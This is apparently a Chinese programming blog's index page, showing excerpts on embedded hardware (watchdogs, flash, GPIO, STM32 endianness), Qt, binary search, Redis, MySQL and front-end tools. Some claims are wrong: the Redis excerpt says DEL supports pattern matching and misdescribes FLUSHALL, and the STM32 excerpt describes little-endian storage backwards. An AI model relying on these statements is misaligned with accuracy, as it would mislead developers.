独立的看门狗：这种看门狗主要有一个用于喂狗的引脚和一个复位引脚，如果没有在一定时间内改变喂狗脚的电平，复位引脚就会改变状态复位CPU，可作为一个完全独立的进程在主应用程序之外运行，其上电工作后无法停止，但是会更加稳定。
3.从运行模式划分，可分为超时狗，窗口狗。
超时狗：即采用Timeout模式计时，在Timeout时间内都可以喂狗，当检测到超过设定的Timeout时间仍未喂狗则会触发进一步安全保护措施。
窗口狗：在某个特定的窗口周期内喂狗才有效。
超时狗比窗口狗使用更加简单，但是没有窗口狗稳定。
二、名词解释 1.喂狗：就是触发看门狗，计数器会被刷新，重新开始计算。按照喂狗频率，喂狗分为快狗Fast-Mode与慢狗Slow-Mode，即快速喂狗与慢速喂狗。在实际使用中，考虑到初始化到周期任务的时间较长，在Wdg初始化后会先设置WDG的运行模式为Slow-Mode，在周期任务正式运行后再切换为Fast-Mode。
2.杀狗：禁用/关闭看门狗。
3.咬狗：当看门狗启动后，计数器开始自动计数，经过一定时间，计数器溢出就会对CPU产生一个复位信号使系统重启（俗称“被狗咬”）。
三、应用（SBC芯片） 以SBC芯片进行举例说明，配置看门狗（窗口狗）窗口的大小需要在在寄存器中配置。需要查看手册，在SBC初始化中对相关寄存器进行配置。
SBC芯片有一个控制引脚debug是控制芯片是否在debug模式的，在debug模式下（debug引脚置高），看门狗将会失效，即喂狗与否都不会使系统复位。在正常模式下（debug引脚置低），在规定的窗口时间内喂狗可使其正常运行，否则出现系统复位现象，使用示波器或逻辑分析仪输出系统复位引脚的波形，来观察复位信号的情况。
观察结果：
在debug模式下（debug引脚处于高电平）喂狗函数使能与失能时，系统不会重启复位,观察波形无波形变化，为持续的高电平。如图1
2.在正常模式下（debug引脚处于低电平），喂狗函数使能，系统不会复位，观察波形无波形变化，为持续的高电平，如图1。喂狗函数失能时，系统重启复位，观察波形为高电平复位信号周期性变化，如图2。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9722286bb01bf553e8fb4020f22befa5/" rel="bookmark">
			比较器与放大器区别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		输出电路
运算放大器：采用双晶体管推挽输出。
比较器：只用一只晶体管，集电极连到输出端，发射极接地。
闭环特性
运算放大器：放大器大都工作在闭环状态,所以要求闭环后不能自激， 速度us级别，较稳定。
比较器：比较器大都工作在开环状态，速度快，ns级别。
对于频率比较低的情况放大器完全可以代替比较器,反过来比较器大部分情况不能当作放大器使用 。
补偿电路
运算放大器：针对线性区工作的需要加入了补偿电路 。
比较器：为了加快响应速度, 中间级很少, 也没有内部的频率补偿。
应用
运算放大器：在开关电源中主要用于反馈电路、过流保护的采样放大，线性放大电路（负反馈）。
比较器：信号电压比较。
符号记忆
运算放大器：±两端有电阻。
比较器：±两端没有电阻。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/354c80bf292b459555e441fb39a63b50/" rel="bookmark">
			KF32  存储（FLASH，EEPROM）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、RAM RAM随机存取存储器 ：类似手机中一般把其叫做（运行）内存。与ROM的最大区别是数据的易失性，即一旦断电所存储的数据将随之丢失。
RAM在计算机和数字系统中用来暂时存储程序、数据和中间结果。
二、ROM ROM只读存储器：类似手机的内部存储空间。
ROM又可以分为EEPROM，Flash：
1.EEPROM 可以随机访问和修改任何一个字节，可以往每个bit中写入0或者1，掉电后数据不丢失，可以保存100年，可以擦写100w次，擦除时以字节为单位，可靠性高，但是电路复杂/成本也高。因此目前的EEPROM都是几十千字节到几百千字节的，绝少有超过512K的。
2.Flash 擦除时以块为单位，电路相对简单，能存储的数据更多，成本低，单位为M的rom一般都是flash。
flash又可以分为nor flash和nand flash；
a. nor flash：数据线和地址线分开，可以实现ram一样的随机寻址功能，
读取：按字节；
擦除：按块擦除。
b. nand flash：数据线与地址线复用，不能利用地址线随机寻址。读取速度慢，擦除与写入的速度快，内部电路简单，存储的数据更多，体积小，容量大，可以标记坏块，从而使软件跳过坏块。
读取：按页；
擦除：按块擦除。
总结：嵌入式系统多用一个小容量的nor flash存储引导代码，用一个大容量的nand flash存放文件系统和内核。
参考EEPROM和flash的区别_yuanlulu的博客-CSDN博客
三、Autosar NVM Autosar NVM位于基础软件的服务层，为所有NV data的（初始化、读、写、控制）维护以及管理作提供了各种同步/异步服务。EEPROM和Flash，都在这层被抽象为同一类型，直到MemIf层才会做出区分。
Autosar 中对nv数据的存储主要包括片内存储和外部存储两种方式，片内存储是用芯片内部的DFLASH进行数据存储，外部存储是通过外部EEPROM进行存储，一般通过IIC,SPI,等通讯方式外挂EEPROM。
在Autosar中规定了四种 NVRAM Block，分别为 NV Block、RAM Block、ROM Block、Administrative Block。
NV Block
NV block是存储NV变量的基本结构，其中Header以及CRC校验非必须项。
RAM Block
由于NV变量的写入与读取都是一件相对较慢的操作，而应用层逻辑操作周期速度又太快。直接操作NV block显然不合适，所以在进行读写之前，会建议一个同样大小的Ram空间来操作、使用、存放这些还没有被写入或者读取的NV值。
在NVM中规定了permanent，temporary 两种类型。其中永久型在项目配置时就必须输入指定的RAM地址；而临时型不需要在项目配置期间就设定。
ROM block 用于存储默认值，以便当NV block数据出现损坏时予以替换。
Administrative block
Administrative block是专门用于对NVRAM Block 与 RAM blcok 的数据安全性进行管理而设计的，它对应用层并不可见。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1cefb3bd2dc8a7c3aadc5ce61e3aef92/" rel="bookmark">
			KF32 GPIO
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		KF32开发 在开发KF32工程时的一些心得，适合新手小白。
GPIO模块的使用 GPIO是通用输入/输出端口的简称，是可控制的引脚，大部分引脚除了当GPIO使用之外，还可以复用位外设功能引脚（比如串口）。
引脚可分为输出模式与输入模式，输出模式通俗理解就是输出高低电平来控制其他硬件，如点灯等，输入模式即为读取其他硬件给他的电平，如键盘输入等。
###初始化
在设计GOIO代码时，需要对GPIO的一些参数进行初始化。
1.输出模式
GPIO_InitTypeDef GPIO_InitStructure;//定义结构体
GPIO_InitStructure.m_Mode = GPIO_MODE_OUT;//配置为GPIO Output模式
GPIO_InitStructure.m_OpenDrain = GPIO_POD_PP;//配置为推挽模式
GPIO_InitStructure.m_PullDown = GPIO_NOPULL;//配置下拉模式为不下拉，配置为GPIO_PULL代表为下拉
GPIO_InitStructure.m_PullUp = GPIO_NOPULL;//配置上拉模式为不上拉，配置为GPIO_PULL代表为上拉
GPIO_InitStructure.m_Speed = GPIO_LOW_SPEED;//配置速度模式为低速
GPIO_InitStructure.m_Pin = GPIO_PIN_MASK_0;//配置需要使用的输出引脚，例：PA0
GPIO_Configuration(GPIOA_SFR, &amp;GPIO_InitStructure);//配置之前设置的配置参数结构体
GPIO_Set_Output_Data_Bits(GPIOA_SFR, GPIO_PIN_MASK_0, Bit_RESET);//配置输出引脚初始电平为低电平，高电平为Bit_SET
初始化结束
程序：
void gpio_init(void)
{
GPIO_InitTypeDef GPIO_InitStructure;
GPIO_InitStructure.m_Mode = GPIO_MODE_OUT;
GPIO_InitStructure.m_OpenDrain = GPIO_POD_PP;
GPIO_InitStructure.m_PullDown = GPIO_NOPULL;
GPIO_InitStructure.m_PullUp = GPIO_NOPULL;
GPIO_InitStructure.m_Speed = GPIO_LOW_SPEED;
GPIO_InitStructure.m_Pin = GPIO_PIN_MASK_0;
GPIO_Configuration(GPIOA_SFR, &amp;GPIO_InitStructure);
GPIO_Set_Output_Data_Bits(GPIOA_SFR, GPIO_PIN_MASK_0, Bit_RESET);
}
2.输入模式
GPIO_InitTypeDef GPIO_InitStructure;//定义结构体
GPIO_InitStructure.m_Mode = GPIO_MODE_IN;//配置为GPIO Input模式
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1cefb3bd2dc8a7c3aadc5ce61e3aef92/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5c7401b0b1a29bae24e202d1327e755d/" rel="bookmark">
			Qt对象树和所有权
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 什么是对象树没有对象树机制会导致的内存释放问题在栈上创建QObject对象的注意事项，及Qt更推荐在堆上创建QObject对象由对象树管理内存需要满足的条件查看对象树机制的相关信息 什么是对象树 详见官方文档Object Trees &amp; Ownership。
对象树是Qt基于元对象系统（meta-object system）机制（需要通过moc编译）提供的一种C++拓展特性，在一定程度上解决了内存问题。
对应QObject对象而言，其构造函数中可以指定自身的父对象指针，这样创建的这个QObject对象会自动添加到其父对象的children()列表中，而多个对象间的父子关系是树状的，因此被称为对象树。
Qt能够保证，任何在对象树中的QObject对象被析构时，如果这个对象有parent，则自动将其从parent的children()列表中删除；如果有child，则自动析构每一个child。
没有对象树机制会导致的内存释放问题 假设没有对象树机制，考虑如下代码：
#include "mainwindow.h" #include &lt;QApplication&gt; #include &lt;QPushButton&gt; int main(int argc, char *argv[]) { QApplication a(argc, argv); MainWindow w; //此处假设没有对象树机制，传入参数仅代表该对象 //需要显示在w之上 QPushButton *btn = new QPushButton(&amp;w); btn-&gt;move(200, 200); //不能在此处析构btn对象，否则按钮无法在w上显示 //delete btn; w.show(); //不能在此处析构btn对象，否则按钮刚在w上显示就被析构了 //delete btn; return a.exec(); //不能在此处析构btn对象，main函数已经返回，不会执行到此处 //delete btn; } 可以看到，对应new出来的btn，我们无法找到合适的位置将其delete，若没有对象树机制，则该代码是内存不安全的。
在栈上创建QObject对象的注意事项，及Qt更推荐在堆上创建QObject对象 在栈上创建QObject对象，并指定父对象时，需要注意对象的析构顺序，考虑如下代码：
#include "mainwindow.h" #include &lt;QApplication&gt; #include &lt;QPushButton&gt; int main(int argc, char *argv[]) { QApplication a(argc, argv); QPushButton btn; //btn先被构造 MainWindow w; //w后被构造 btn.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5c7401b0b1a29bae24e202d1327e755d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/31cc5a684e358efaabeedd41af46dcfa/" rel="bookmark">
			写对二分查找不是套模板并往里面填空，需要仔细分析题意
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		视频讲解：《算法不好玩》二分查找专题 （已经录制的部分，能够帮助大家完全搞懂二分查找算法，非常适合初学的朋友们）。
2022 年 12 月 27 日补充：有时间的话请大家先看上面的视频，2 倍速看完就好，知道前因后果以后，再做题就更有方向了。文字题解的内容还是更偏向于做题，直接给出了最优解，没有一步一步探索的过程。这里帮大家归纳一下重点：有一些问题可以在循环之中找到答案，所以写法是 while(left &lt;= right) ，循环体内是三个分支。更多的问题需要等到退出循环以后得到答案，所以写法是 while(left &lt; right) ，循环体内是两个分支。
实际上「二分查找」没有多少东西，一点儿也不难，觉得「二分查找」难写对的朋友，请认认真真做几个「二分查找」的问题，弄清楚每一行代码的意思，遇到死循环的时候仔细调试，弄清楚逻辑关系，而不要套别人给你写好的模版。
有很多问题 mid 有可能是问题的答案，所以不能排除掉，所以你看到的代码是 left = mid 与 right = mid，不要有思维定式，代码一定要写成 left = mid + 1 或者 right = mid - 1，而应该看题目怎么说。看清问题比记忆模版重要得多，不同的问题答案不一样，如果题目的意思都没弄清楚，怎么解决问题。
如果你在学习二分查找的过程中有很多问题，你可以先记下来，不用急着与解决它们，等你做了足够多的问题，有了足够的思考以后，你的问题会慢慢得到解答，我的学习过程也是这样，这个过程是很充实的。
阅读提示：内容比较多，核心思想帮大家归纳一下。如果没有时间看，建议把后面的问题做一下。
题解核心内容：所有模板都一样，不可以套模板，而应该 仔细看题（解题的关键在认真读题），分析清楚题目要找的答案需要满足什么性质。采用两边夹的方式，每一轮把待搜索区间分成两个部分，排除掉一定不是答案的区间，最后左右指针重合的地方就是我们要找的元素。
重要的事情说三遍：
如果你看我写的「二分查找」题解，请忘记掉「左闭右开」这件事情，它会对你有所干扰；如果你看我写的「二分查找」题解，请忘记掉「左闭右开」这件事情，它会对你有所干扰；如果你看我写的「二分查找」题解，请忘记掉「左闭右开」这件事情，它会对你有所干扰。 说明：我所有的关于「二分查找」法的题解，都会明确地标注「下一轮搜索区间是什么」，进而设置左边界 left 和 右边界 right。在我写的「二分查找」题解里，while(left &lt; right) 不表示 循环不变量的区间定义是 [left..right)，也就是说，如果我分析出，下一轮搜索区间是 [mid..10]，我会设置 right = 10，而不会设置 right = 11。
while(left &lt; right) 只表示它本来的意思：在 left &lt; right 进入循环体。不要给它附加别的意思，这没有逻辑。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/31cc5a684e358efaabeedd41af46dcfa/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5adee0ea74f97df1e2f6af0ccc16e6f8/" rel="bookmark">
			SpringBoot整合Ip2region获取IP地址和定位
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.Ip2region的介绍 1.1.Ip2region 是什么 ip2region v2.0 - 是一个离线IP地址定位库和IP定位数据管理框架，10微秒级别的查询效率，提供了众多主流编程语言的 xdb 数据生成和查询客户端实现 。
1.2.Ip2region 特性 1.2.1 标准化的数据格式 每个 ip 数据段的 region 信息都固定了格式：国家|区域|省份|城市|ISP，只有中国的数据绝大部分精确到了城市，其他国家部分数据只能定位到国家，后前的选项全部是0。
1.2.2.数据去重和压缩 xdb 格式生成程序会自动去重和压缩部分数据，默认的全部 IP 数据，生成的 ip2region.xdb 数据库是 11MiB，随着数据的详细度增加数据库的大小也慢慢增大。
1.2.3.极速查询响应 即使是完全基于 xdb 文件的查询，单次查询响应时间在十微秒级别，可通过如下两种方式开启内存加速查询：
vIndex 索引缓存 ：使用固定的 512KiB 的内存空间缓存 vector index 数据，减少一次 IO 磁盘操作，保持平均查询效率稳定在10-20微秒之间。xdb 整个文件缓存：将整个 xdb 文件全部加载到内存，内存占用等同于 xdb 文件大小，无磁盘 IO 操作，保持微秒级别的查询效率。 1.2.4.IP 数据管理框架 v2.0 格式的 xdb 支持亿级别的 IP 数据段行数，region 信息也可以完全自定义，例如：你可以在 region 中追加特定业务需求的数据，例如：GPS信息/国际统一地域信息编码/邮编等。也就是你完全可以使用 ip2region 来管理你自己的 IP 定位数据。
2.Java方式 2.1.下载ip2region.xdb 狮子的魂 / ip2region
下载完后放到工程的resources目录下
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5adee0ea74f97df1e2f6af0ccc16e6f8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dbe8cdf3cf5f25b72495c16168e028b5/" rel="bookmark">
			JavaScript 学习笔记 超详细（b站pink老师）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		权威网站： MDN
JavaScript权威网站： https://developer.mozilla.org/zh-CN/docs/Web/JavaScript
目录
一、JavaScript基础
1.JavaScript介绍
1.1 JavaScript 是什么 1.2 JavaScript 书写位置
1.3 JavaScript 注释 1.4 JavaScript 结束符
1.5 JavaScript 输入输出语法
1.6 字面量
2.变量
2.1 变量是什么？
2.2 变量的基本使用
2.3 变量的本质
2.4 变量命名规则与规范
2.5变量拓展-let和var的区别
2.6变量拓展-数组
3.常量
4.数据类型
4.1 数据类型 – 数字类型（Number）
4.2 数据类型 – 字符串类型（string）
4.3数据类型 – 布尔类型（boolean）
4.4数据类型 – 未定义类型（undefined）
4.5数据类型 – null（空类型）
4.6控制台输出语句和检测数据类型
5.类型转换
5.1 为什么需要类型转换
5.2 隐式转换
5.3 显式转换
综合案例：用户订单信息案例
6.运算符
6.1 赋值运算符
6.2 一元运算符
6.3 比较运算符
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/dbe8cdf3cf5f25b72495c16168e028b5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8e9fb3f74d074c3a3ad8ffd9e03ae3c6/" rel="bookmark">
			Redis 之 UNLINK 命令
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Redis 的 UNLINK 命令用于异步删除一个或多个键，它是 Redis 的 4.0 版本引入的新命令。UNLINK 命令的作用类似于 DEL 命令，都是用于删除键值对，但是它的实现方式略有不同。
UNLINK 命令的主要特点是它是非阻塞的，它会在后台异步地删除键值对，而不会阻塞服务器的正常操作。这使得 UNLINK 命令非常适合于删除大量键值对或者删除耗时较长的键值对，因为它可以在后台完成删除操作，而不会对其他操作产生影响。
UNLINK 命令的语法如下：
UNLINK key [key ...] 其中，key 是要删除的键的名称，可以同时指定多个键。
与 DEL 命令不同，UNLINK 命令不接受模式匹配参数，只能指定具体的键名。如果需要使用模式匹配删除多个键值对，仍然需要使用 DEL 命令。
UNLINK 命令的返回值与 DEL 命令相同，表示成功删除的键的数量。
这个命令可以同时删除多个键，而不仅仅是一个。执行该命令后，指定的键值对将从Redis内存中删除，不再占用任何空间。如果某个键不存在，该命令不会报错，而是直接跳过该键。
需要注意的是，unlink命令仅仅是删除键值对，并不会立即将数据从磁盘上删除。如果需要将数据从磁盘上永久删除，可以使用FLUSHALL命令或者在配置文件中设置maxmemory-policy为volatile-lru或allkeys-lru。
总结来说，UNLINK 命令是 Redis 提供的一种非阻塞删除键值对的方式，适用于大量或耗时较长的删除操作。
转载本文，请注明出处、作者
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b117d4201b63cc632bb6d1e0e6d66bbb/" rel="bookmark">
			Solidwoks PDM Add-ins (C#) 创建Add-ins
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本主题演示如何在Microsoft Visual Studio Enterprise 中使用Visual C#创建并调试add-in。
注意： 因为 SOLIDWORKS PDM Professional无法强制重新加载在 .NET 中编写的add-in程序，则必须重新启动所有客户端计算机，以确保使用最新版本的add-in程序。
启动 Visual Studio File(文件) &gt; New(新建) &gt; Project(项目) &gt; Visual C# &gt; Windows &gt; Class Library(类库)选择版本。更多信息见 Using .NET Framework for Add-in Applications 在“名称”中键入项目的名称。单击浏览并选择创建项目路径。单击确定(ok)。 修改类名（可选） 在“解决方案资源管理器”中右击项目名称，然后单击“添加引用”。 单击左侧面板中的 COM，选择PDMWorks Enterprise 2019 Type Library，确定。单击左侧面板中的程序集-&gt;框架，选择System.Windows.Forms(WF)，或者选择Presentation-Framework(WPF)，确定。关闭窗口。 需要把EdmLib嵌入互操作设置为False
在“解决方案资源管理器”中右击项目名称，然后单击“属性”。 “应用程序&gt;程序集信息”。取消勾选“使程序集 COM 可见（M）”。在“生成”选项卡上，勾选“为 COM 互操作注册（C）”。 将此设置为调试加载项： 选择调试选项卡。选择 启动外部程序（X） 选择 C:\Windows\System32\notepad.exe如果在64位计算机上创建Add-in，在记事本中编辑 project_path\project_name\project_name\project_name.csproj 在 &lt;PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' "&gt; 下方 和 &lt;PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b117d4201b63cc632bb6d1e0e6d66bbb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/30cad2b08867c7d04391a600b9602c31/" rel="bookmark">
			解决谷歌浏览器不显示翻译此页按钮（网页自动翻译）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		多数情况下，碰见非简体中文网页，地址栏会显示翻译此页图标。误关或者由于其他原因，未出现此功能，可以尝试使用如下方式重新开启。
注意！！！2022年10月3日 谷歌公司宣布，因使用率低终止了在中国大陆的谷歌翻译服务。
如需翻译请自备梯子
1、打开设置页--&gt;高级--&gt;开启 询问是否翻译非您所用语言的网页 功能，重启浏览器。
如果此时依然未出现翻译此页按钮，接着看，
1、找到英语--&gt;右侧三个点--&gt;勾选以这种语言显示，重启。
2、找到中文(简体)--&gt;右侧三个点--&gt;移除简体中文--&gt;重新添加语言，找到简体中文，重新添加，重启浏览器
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/98c19a6cafc24fd61310ee702cf803dc/" rel="bookmark">
			monaco-editor插件自定义编辑器内容颜色
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		开始之前先说一下他的自定义内容颜色的api
monaco.languages.setMonarchTokensProvider((languageId: string, languageDef: IMonarchLanguage | Thenable&lt;IMonarchLanguage&gt;))
参数解析：接收两个参数
一个是你要设置的编辑器语言种类，可以是sql,html,css,javascript等第二个参数就是具体设置不同关键字颜色的配置 monaco.languages.setMonarchTokensProvider('sql', { // 设置语法规则 tokenizer: { root: [ [/\b(SELECT|FROM|WHERE|ORDER BY|GROUP BY|JOIN|LEFT JOIN|RIGHT JOIN|INNER JOIN|ON)\b/, 'keyword'], // SQL关键字 [/\b(AND|OR|NOT)\b/i, 'operator'], [/'([^'\\]*(\\.[^'\\]*)*)'/, 'defineColor'], } }); 这里着重讲一下第二个参数：
[/\b(AND|OR|NOT)\b/i, 'operator'] ：该数组由两部分组成，第一部分是要匹配的字段的正则表达式，这里的意思是对“AND|OR|NOT”三个关键字进行单独设置颜色；
第二部分就是对应设置颜色的代名词，他可以由两种方式传入；
一种就是官方预先设置好的一些颜色名词如：具体名词和颜色的对应关系可以参考（Monaco Editor）
另一种方式就是我们在代码中提前设置好一些关键字以及他们的十六进制颜色编码，然后在使用，具体使用如下：
// 定义一个主题，通过rules关键字来设置自定义颜色名词， monaco.editor.defineTheme("myTheme", { base: "vs", inherit: true, rules: [ {token:'通知', foreground:'FF0000'}, ], }); monaco.editor.setTheme("myTheme"); // 使用 monaco.languages.setMonarchTokensProvider('sql', { // 设置语法规则 tokenizer: { root: [ [/\b(AND|OR|NOT)\b/i, '通知'], } }); 解析： 这里通过defineTheme方法的rules属性来添加一个自定义颜色，名字是“通知”，颜色是红色，然后在单独对“AND|OR|NOT”关键字设置我们我们定义的“通知”颜色
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/98c19a6cafc24fd61310ee702cf803dc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d038b88ffe0b2366e439b2b1a62a4fe8/" rel="bookmark">
			STM32是大端模式还是小端模式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、为什么会有大端模式和小端模式？ 在计算机系统中，数据存储是以字节为单位的，每个地址单元都对应着一个字节，一个字节为 8bit。但是在C语言中除了8bit的char之外，还有16bit的short型，32bit的long型（要看具体的编译器）。另外，对于位数大于 8位的处理器，例如16位或者32位的处理器，由于寄存器宽度大于一个字节，那么必然存在如何将多个字节进行存储的问题，因此就区分出大端存储模式(big endian)和小端存储模式(little endian)。
2、什么是大端模式和小端模式？ 大端模式：数据的高字节保存在内存的低地址中， 数据的低字节保存在内存的高地址中;
小端模式：高字节保存在高地址， 低字节保存在低地址中;
举例说明（0x1234）：
地址0x08000000(低地址)0x08000001（高地址）大端模式0x120x34小端模式0x340x12 3、STM32是大端模式还是小端模式？ STM32是小端模式，即数据的高字节保存在低地址单元，数据的低字节保存在高地址单元，正好与我们的读数相反。例如将某些系统默认参数保存到STM32自带的FLASH中，打开Memory 视图即可看出数据的存储情况。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a9ad702604daf1316c53835df668edd6/" rel="bookmark">
			element-ui 实现文件上传（多种文件格式）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		&lt;template&gt; &lt;div&gt; &lt;el-form :model="dataForm" ref="dataForm" label-width="100px" label-position="left" :rules="rules"&gt; &lt;el-form-item label="文件：" prop='fileList'&gt; &lt;el-upload class="upload-demo" ref="upload" drag :data="{ type: 'other' }" :limit="5" accept=" .xlsx, .pdf, .doc, .docx, .xls, .rar, .zip, .png , .jpg, .jepg" :action="url" :headers="headers" :file-list="dataForm.fileList" :auto-upload="true" :before-upload="beforeUpload" :on-remove="handleRemove" :on-exceed="handleExceed" :on-change="handleChange" :on-success="handlePreview"&gt; &lt;i class="el-icon-upload"&gt;&lt;/i&gt; &lt;div class="el-upload__text"&gt;将文件拖到此处，或&lt;em&gt;点击上传&lt;/em&gt;&lt;/div&gt; &lt;div class="el-upload__tip" slot="tip"&gt;支持上传格式：pdf、doc、docx 、xlsx 、xls、 ppt 、pptx 、zip 、rar 、png 、jpg 、jpeg一次最多上传5个文件 &lt;/div&gt; &lt;/el-upload&gt; &lt;/el-form-item&gt; &lt;/el-form&gt; &lt;/div&gt; &lt;/template&gt; // 上传前校验 beforeUpload(file) { if(file.size&gt;1024*1024*500){ this.$message.warning("你上传的 \“"
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a9ad702604daf1316c53835df668edd6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b75ab4d34af11daeae5da1336c1445f9/" rel="bookmark">
			mysql中的group by 和 having使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		mysql中的group by 和 having 使用
理论 –sql中的group by 用法解析：
– Group By语句从英文的字面意义上理解就是“根据(by)一定的规则进行分组(Group)”。
–它的作用是通过一定的规则将一个数据集划分成若干个小的区域，然后针对若干个小区域进行数据处理。
–注意:group by 是先排序后分组；
–举例子说明：如果要用到group by 一般用到的就是“每这个字” 例如说明现在有一个这样的表：每个部门有多少人 就要用到分组的技术
select DepartmentID as ‘部门名称’,
COUNT(*) as ‘个数’ from BasicDepartment group by DepartmentID
–这个就是使用了group by +字段进行了分组，其中我们就可以理解为我们按照了部门的名称ID
–DepartmentID将数据集进行了分组；然后再进行各个组的统计数据分别有多少；
–如果不用count(*) 而用类似下面的语法
select DepartmentID,DepartmentName from BasicDepartment group by DepartmentID
–将会出现错误
–消息 8120，级别 16，状态 1，第 1 行
–选择列表中的列 ‘BasicDepartment.DepartmentName’ 无效，因为该列没有包含在聚合函数或 GROUP BY 子句中。
–这就是我们需要注意的一点，如果在返回集字段中，这些字段要么就要包含在Group By语句的后面，
–作为分组的依据；要么就要被包含在聚合函数中。
–出现的错误详解:咱们看看group by 的执行的过程,先执行select 的操作返回一个程序集，
–然后去执行分组的操作，这时候他将根据group by 后面的字段
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b75ab4d34af11daeae5da1336c1445f9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/98a8d6dc74d62558306dd1cb0c3fdfbf/" rel="bookmark">
			IEEE Signal Processing Letters投稿记录
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		记录一下投稿过程：
2022.12.20 Prescreen编辑部预审，这个阶段比较关键
2023.12.25 AE Assignment分配学术编辑
2023.03.18 AQ(ACCEPTED WITH MANDATORY CHANGES)小修，给了两周时间
2023.03.24 Outstanding Revision Reminder催我提交修改稿
2023.04.03 提交返修稿
2023.04.12 ACCEPTED录用
2023.06 WOS检索
时间 ：总结起来，3个月拿到AQ，修改10天，AE在14天后录用，总用时将近4个月。稿件处理速度与预期相符。
审稿意见 ：4个审稿人，3个同意接收，1个拒绝。审稿意见中规中矩，没有太刁钻的问题，有两个审稿人提的意见比较中肯，但都是讨论，无需修改论文。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d2477f1af9e26890798c17c6c6d0a7aa/" rel="bookmark">
			用C语言实现 折半（二分）查找法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		折半查找法，也称二分查找法。
其 实现要求 为：
1.数据必须为有序数列
（有序：指数据必须是连续递增或递减的排列）
2.存储结构一定为顺序存储
3.关键字大小必须有序排列
其 基本思想 为：
1. 将要查找的数据与有序数列里中间的元素进行比较，若相等，则找到，然后输出位置。
2. 若要找数据大于中间元素的值，则再从数组的后一半元素中进行查找；否则，就从数组的前一半元素中进行查找。
3. 若将数组全部折半完后仍找不到，则输出“没找到”。
下面来代码实现：
int main() { int arr[10] = { 0 }; int n;//要查找的数据 int low=0, high=9, mid;//数组最左边，最右边，折半的中间 printf("请输入数组的数据值\n");//必须为有序（递增，减）数列 for (int i = 0; i &lt; 10; i++) { scanf("%d", &amp;arr[i]); } printf("请输入要查找的数据\n"); scanf("%d",&amp;n); while (low &lt;= high) { mid = (low + high) / 2; if (arr[mid] &gt; n)//中间值大于要查找数据，则数据在前半部分 { high = mid - 1; } if (arr[mid] &lt; n) { low = mid + 1; } if (arr[mid] == n) { printf("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d2477f1af9e26890798c17c6c6d0a7aa/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e6166048fa76e4a038134d41f4ba5d45/" rel="bookmark">
			H265/HEVC
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		原文地址：https://blog.csdn.net/zhiyuan2021/article/details/117300582
